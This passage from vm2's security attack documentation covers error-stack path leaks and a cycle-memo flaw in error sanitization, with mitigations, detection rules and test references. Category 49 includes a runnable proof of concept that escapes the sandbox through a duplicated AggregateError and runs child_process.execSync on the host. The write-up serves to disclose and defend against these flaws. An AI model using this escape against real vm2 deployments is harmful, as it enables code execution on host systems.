This restores **[Defense Invariant #3](../ATTACKS.md#defense-invariants)** (host-realm error carriers reaching sandbox callbacks are sanitized) at the *invocation* layer rather than the direct-call-site layer — every sandbox callback bound to a host Promise's `then`/`catch` is now sanitized regardless of how `then`/`catch` was invoked. It mirrors Category 37's promotion of the v6mx proto-mutator peel from positional to mechanism-independent.

### Detection Rules

- Sandbox source invoking a host-Promise method through indirection: `.then.call(`, `.then.apply(`, `.catch.call(`, `.catch.apply(`, or stacked `.call.call` / `.apply.call` chains terminating at a host Promise's `then`/`catch`.
- A host `onRejected`/`onFulfilled` reached via such indirection reading a non-`message` own property of the received error (`e.detail`, `e.originalError`, `e.context`, …) and dereferencing it as an object/function.
- A `call`/`apply` chain on a bridged host method exceeding a small depth (deny-on-exceed is the tripwire).

### Considered Attack Surfaces

- **`bind` / `Reflect.apply` / `Reflect.construct`** — verified already-safe: `bind` re-enters the trap with the direct target when the bound function is called; sandbox `Reflect.apply` invokes the target directly (direct-gate wraps it); `Reflect.construct(then)` throws (Promise methods are not constructors). All asserted in `test/ghsa/GHSA-647f-g98j-qq25/repro.js`.
- **Descriptor extraction** — `Object.getOwnPropertyDescriptor(proto, 'then').value` then `.call` re-enters the apply trap and is normalized identically; on current Node it additionally trips the "incompatible receiver" brand check.
- **Fulfillment values carrying host objects** — a host function that *resolves* with `{ secret: process }` yields a functional proxy on the fulfill path. This is unchanged, pre-existing, documented vm2 behavior (the bridge wraps host objects functionally, not capability-restricted) and identical on the direct `p.then(cb)` path — **not** in scope of this category, which concerns the rejection *rebuild* channel only.

### Fix shape

`lib/bridge.js` — `normalizeHostPromiseCallbacks` (+ helpers `makeSanitizedPromiseCallback`, `copyPromiseArgArray`, `isHostFunctionCall`/`isHostFunctionApply`, cached `otherFunctionCall`/`otherFunctionApply`). Node 8+ compatible (no post-ES2022 syntax). Tests: `test/ghsa/GHSA-647f-g98j-qq25/repro.js` (6 indirection vectors + 3 mixed/stacked siblings + 4 already-safe controls + 3 over-block guards).

---

## Attack Category 48: Host Filesystem Path Leak via Host-Realm Error Stack

**Advisories**: GHSA-v27g-jcqj-v8rw, GHSA-x6m4-chr9-cg97

**Tests**: test/ghsa/GHSA-v27g-jcqj-v8rw/, test/ghsa/GHSA-x6m4-chr9-cg97/

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation)

**Supersedes**: completes [GHSA-v27g-jcqj-v8rw](../ATTACKS.md#defense-invariants) (`defaultSandboxPrepareStackTrace` / CallSite host-frame redaction). v27g redacts host frames only when the stack is formatted **in the sandbox realm**; this category is the residual where the stack was formatted **host-side** and crosses the bridge pre-formatted.

### Description

`Error.prototype.stack` is a lazily-computed, per-realm string. v27g installs `defaultSandboxPrepareStackTrace` and `applyCallSiteGetters` so that when the sandbox realm formats an Error's `.stack`, host frames (absolute paths, `node:` / `internal/` pseudo-paths) are blanked and only sandbox frames + the message survive. That guarantee covers only sandbox-realm formatting.

A **host-realm** Error carries a `.stack` already formatted by the host (V8's default formatter, embedding absolute host paths, Node internals, and the embedding application's own source path). That string crosses the bridge to the sandbox verbatim — v27g's sandbox-realm formatter never runs on it. This is information disclosure (host filesystem layout, deployment path, vm2 install location); no code execution.

The config-free canonical trigger routes through vm2's own host-side transformer: sandbox `eval("@@@ catch")` (also `new Function(…)`, `GeneratorFunction`/`AsyncFunction` constructors, multi-arg `new Function`) calls `host.transformAndCheck`, which throws a host-realm `SyntaxError` whose `.stack` names `lib/transformer.js`, `lib/vm.js`, `lib/setup-sandbox.js`, `node:vm`, and the embedder's files. But the primitive is general: **any** embedder-exposed host function that throws (`sandbox: { f() { throw new Error() } }`), and any host builtin that throws (`Buffer.from(Symbol())`, `Buffer.alloc(-1)`), delivers a host-formatted `.stack` the sandbox can read.

CVSS 3.1: 5.8 / Moderate (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N). CWE-209 (Information Exposure Through an Error Message), CWE-497 (Exposure of System Data).

### Delivery paths (why one chokepoint is insufficient)

A host error surfaces to the sandbox in one of two shapes, chosen by V8-lazy-stack timing and by whether the carrier has dangerous own-props:

1. **Live bridge proxy** — the sandbox reads `e.stack` (or `Object.getOwnPropertyDescriptor(e,'stack').value`, `Reflect.get(e,'stack')`) through the bridge `get` / `getOwnPropertyDescriptor` traps.
2. **`handleException` rebuild** (`sanitizeHostOwnProps`, GHSA-m283) — the carrier is rebuilt as a fresh sandbox-realm Error, and `.stack` is carried across as a **primitive own property via `v = e[k]`, which never crosses the bridge get trap**. A bridge-only patch leaves this path leaking (demonstrated by pairing with the GHSA-cfcw prototype-severance repro: a `Buffer.from(Symbol())` stack leaks with zero bridge fires).

### Mitigation

Three chokepoints, each dropping host frames from a host Error's `.stack` while preserving the message header and clean sandbox frames (a bare filename with no path separator, no URL scheme, no `..`). All reuse a classifier mirroring v27g's `isHostFrameFileName`, extended to also treat `file:` / `wasm:` URL-scheme frames (ESM / WASM host frames) and `..`-traversal relative paths as host:

1. **`lib/bridge.js` — `get` + `getOwnPropertyDescriptor` traps** (`redactHostStack`). Gated by `isOtherErrorObject`, which ORs the `[[ErrorData]]` brand (host `Object.prototype.toString` → `"[object Error]"`, immune to prototype-chain severance) with a proto-walk to host `Error.prototype` (immune to `Symbol.toStringTag` spoofing) — so neither the GHSA-cfcw severance nor a tag override smuggles a host error's stack past redaction. Ordinary bridge-crossing objects (a non-Error host object with a `stack` string) are untouched — the embedder may legitimately expose such data. The descriptor trap must handle both V8 shapes: up to Node 20 `stack` is an own **data** property (redact `desc.value`), but from Node 22 (V8 12.x) it is an own **accessor**, and forwarding that getter would let `Object.getOwnPropertyDescriptor(hostErr, 'stack').get.call(hostErr)` (equally `__lookupGetter__`, `Object.getOwnPropertyDescriptors`) pull the raw host-formatted string through the apply trap. The accessor is therefore collapsed to a redacted data descriptor, and a throwing or non-string getter fails closed to no stack at all.
2. **`lib/setup-sandbox.js` — `sanitizeHostOwnProps`** (`x6m4RedactHostFramesFromStack`). Redacts the `.stack` primitive on the m283 rebuild path (delivery path 2), which the bridge cannot reach.
3. **`lib/vm.js` — `transformAndCheck`** (defense in depth). Every transformer/`eval`/`Function` compile error is sandbox-destined, so its whole frame section is truncated to the message header host-side, pre-bridge. Truncating the entire section (rather than line-filtering) makes the highest-frequency, config-free path immune to frame-format evasions (eval-origin nesting, exotic frame shapes) and to `.stack`-getter TOCTOU. Top-level `VM.run` / `VMScript` compile errors are destined for the host embedder and are deliberately untouched.

All redactors use module-load-cached `String.prototype` intrinsics and primitive string accumulation (no Array container, no sandbox-tamperable method reachable — Defense Invariant #11), are bounded against DoS, and fail closed. This restores the v27g guarantee (host frames redacted, sandbox frames + message preserved) independent of the realm that formatted the stack.

### Detection Rules

- Sandbox source reading `.stack` (or a `stack` descriptor) off a value caught from `eval` / `new Function` / a bridged host call.
- A stack string delivered to the sandbox containing an absolute path, `node:` / `internal/` / `file:` / `wasm:` frame, a `..`-traversal path, or a vm2 `lib/*.js` source path.

### Considered Attack Surfaces

- **`Error.captureStackTrace` / custom `Error.prepareStackTrace` on a caught host error** — cannot re-expose the origin: the caught value is either a bridge proxy (CallSite getters redacted by v27g) or an already-rebuilt sandbox error (host CallSites gone). Asserted in `adversarial.js`.
- **Non-Error host object with a `.stack` string** — out of scope: that is embedder-supplied data, not a V8-autopopulated error stack; `isOtherErrorObject` excludes it so legitimate data is never corrupted (same boundary as Category 38's "embedder intentionally exposes references").
- **Relative host frames without `..`** (e.g. a host launched so frames read `foo/bar.js`) — extremely narrow; a sandbox VMScript filename with a separator would be over-redacted if the classifier keyed on separators, so the classifier stays keyed on absolute / scheme / `..` markers to avoid dropping legitimate sandbox frames.

### Fix shape

`lib/bridge.js` (`redactHostStack` + `isOtherErrorObject` + `isHostStackFrameFile`), `lib/setup-sandbox.js` (`x6m4RedactHostFramesFromStack` in `sanitizeHostOwnProps`), `lib/vm.js` (`redactTransformerErrorStack` around `transformAndCheck`). Node 8+ compatible. Tests: `test/ghsa/GHSA-x6m4-chr9-cg97/repro.js` (8) + `adversarial.js` (9: Function-family, captureStackTrace/prepareStackTrace, toString, file://, `..`, host-builtin path-b).

---

## Attack Category 49: Revisited Host Error Carrier Leaks a Live Proxy Through the Sanitizer Cycle Memo

**Advisories**: none

**Tests**: none linked

**Uses**: [Category 38: `Error.cause` Host Reference Leak to Sandbox](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox)

**Supersedes**: closes the cycle-memo gap in the [Category 38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox) fix. Category 38 rebuilds host-wrapped `AggregateError` / `SuppressedError` carriers into fresh sandbox-realm errors, but its cycle-detection memo stored a presence bit and returned the raw carrier on revisit — safe only for the *seal-in-place* carriers, not the *rebuilt* ones.

### Description

`handleException` (`lib/setup-sandbox.js`) is the transformer's caught-exception chokepoint. It guards against cyclic error graphs with a `visited` `WeakMap`: on first encounter it records the carrier, and on a repeat encounter within the same traversal it short-circuits and returns without re-recursing. The Category 38 fix stored `visited.set(e, true)` and short-circuited with `return e` — the **raw host carrier**.

That is correct for carriers sanitized *in place*: a plain host `Error` has its `.cause` overwritten and its own properties sealed on the underlying host object (`sanitizeErrorCause` / `sanitizeHostOwnProps`), so the raw carrier returned on revisit is already neutralized. But the `AggregateError` / `SuppressedError` handlers do **not** seal in place — they **snapshot-and-rebuild** the carrier into a fresh sandbox-realm error and drop the original. The raw carrier and its sanitized replacement are therefore *different objects*, and the presence-bit memo cannot return the replacement. When the same host aggregate is revisited within one traversal, the short-circuit hands back the raw host proxy, which the rebuild re-embeds into the "sanitized" `errors[]` (or `.error` / `.suppressed`). Its own properties — `err.leak = process`, or a prototype-chain reference — are fully live: `e.errors[i].leak.mainModule.require('child_process').execSync(...)` → host RCE on the exact channel Defense Invariant #3 promises to sanitize.

### Attack Flow

1. An embedder-exposed host function throws a host-wrapped `AggregateError`/`SuppressedError` whose graph references one node twice within a single `handleException` traversal — a self-cycle (`agg.errors = [agg]`), a duplicate in the array (`[shared, shared]`), or a mutual cycle (`a.errors = [b]; b.errors = [a]`) — with a host reference parked on a rebuild-surviving slot (`agg.leak = process`).
2. Sandbox `try { hostThrow() } catch (e) { … }` routes `e` through `handleException`.
3. The proto-walk dispatches to `sanitizeAggregateError`; the host-wrapped branch reads `.errors` and recurses `handleException(item, visited)` on each element.
4. The second reference to the carrier hits the `visited` short-circuit → `return e` (raw proxy) → pushed into the rebuilt `errors[]`.
5. Sandbox walks `e.errors[i].leak` → live host `process` → RCE.

### Canonical Example(s)

```js
const {VM} = require('vm2');
// duplicate-in-array — the same host aggregate referenced twice
new VM({sandbox:{hostThrow(){
  const shared = new AggregateError([], 'shared'); shared.leak = process;
  throw new AggregateError([shared, shared], 'all failed');
}}}).run(`try{hostThrow()}catch(e){ e.errors[1].leak.mainModule.require('child_process').execSync('id') }`);

// self-cycle:  const agg = new AggregateError([],'x'); agg.errors=[agg]; agg.leak=process; throw agg;
// mutual:      a.errors=[b]; b.errors=[a]; b.leak=process; throw a;
// residual:    same PLAIN host Error listed twice with a prototype-chain leak
//              (sanitizeHostOwnProps rebuilds it but the memo still pointed at the raw carrier)
```

### Why It Works

The `visited` map conflated two different needs. For seal-in-place carriers the memo only needs a presence bit — a revisit can safely return the (now-neutralized) original. For rebuild carriers the memo must return the *replacement*, because the original is never neutralized. Storing `true` made a revisit resolve to the raw carrier for both. The rebuild also reads sub-errors *before* recursing, so the memo entry for the carrier itself did not yet point anywhere useful — the classic cyclic-structure rebuild problem.

### Mitigation

Restore [Defense Invariant #3](../ATTACKS.md#defense-invariants) at the memo chokepoint by making **the value stored in `visited` for a carrier be exactly what a revisit must return**:

- Default memo `visited.set(e, e)` — seal-in-place carriers resolve a revisit to themselves; the short-circuit returns the memoized value, never a bare `true`.
- **Two-phase rebuild** for host-wrapped `AggregateError` / `SuppressedError`: construct the empty sandbox-realm replacement, register `visited.set(carrier, replacement)` **before** recursing into sub-errors (so every cycle shape terminates on the replacement), then install the sanitized children as plain own data properties via `localReflectDefineProperty`. Attacker own-properties are dropped by construction.
- Memoize the `sanitizeHostOwnProps` rebuild too (a plain host error listed twice with a prototype-chain leak would otherwise return the raw carrier on the revisit).
- Defense-in-depth: `_blockHostWrapped` at every rebuild embed site replaces any element that is *still* `_isHostWrapped` after the recursive call with a neutral sandbox `Error` — an independent second layer, agnostic to why an element remained host-wrapped, that also catches any future rebuild path forgetting to sanitize an element.

`.message` is copied only when it is a primitive string, so it carries no host reference; `_isHostWrapped` is spoof-proof because the bridge `get` trap returns `isProxy === true` before consulting the host object, so an own `isProxy: false` cannot suppress detection.

### Detection Rules

- A recursion memo (`visited`/`seen` `WeakMap`/`Set`) that stores a boolean and returns the *input* on revisit, while the same function *rebuilds* rather than mutates its input — the revisit and the rebuild diverge.
- Any host-wrapped error rebuild that reads `.errors` / `.error` / `.suppressed` and re-embeds a recursion result without asserting the result is sandbox-realm.

### Considered Attack Surfaces

- **TOCTOU on `.errors` / `.error` / `.suppressed`** — each slot is read once into a local before iteration; a non-array `.errors` accessor fails `localArrayIsArray` and yields an empty replacement. Asserted in `adversarial.js`.
- **`.message` accessor returning a host object** — copied only when `typeof === 'string'`, so a non-primitive message is ignored.
- **Replacement construction throwing** (`new LocalAggregateError` unavailable) — falls back to `new LocalError(msg)`, still sandbox-realm; the fallback path is inside the same two-phase memo registration.
